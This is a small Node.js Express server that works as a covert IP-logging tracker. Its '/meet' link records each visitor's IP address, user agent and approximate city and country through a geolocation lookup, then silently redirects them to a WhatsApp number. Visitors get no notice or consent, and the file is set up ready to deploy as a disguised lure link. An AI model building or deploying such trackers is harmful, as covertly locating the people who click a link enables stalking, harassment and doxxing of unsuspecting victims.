const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

// Your redirect target
const REDIRECT_URL = 'https://wa.me/919876543210'; // Change this to your destination

app.get('/meet', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const location = geoRes.data;

    console.log(`📍 New Visit`);
    console.log(`IP: ${ip}`);
    console.log(`Location: ${location.city}, ${location.regionName}, ${location.country}`);
    console.log(`User Agent: ${userAgent}`);
    console.log(`Time: ${timestamp}`);
  } catch (err) {
    console.error('⚠️ Error fetching location:', err.message);
  }

  res.redirect(REDIRECT_URL);
});

app.listen(PORT, () => {
  console.log(`🚀 Tracker running at http://localhost:${PORT}`);
});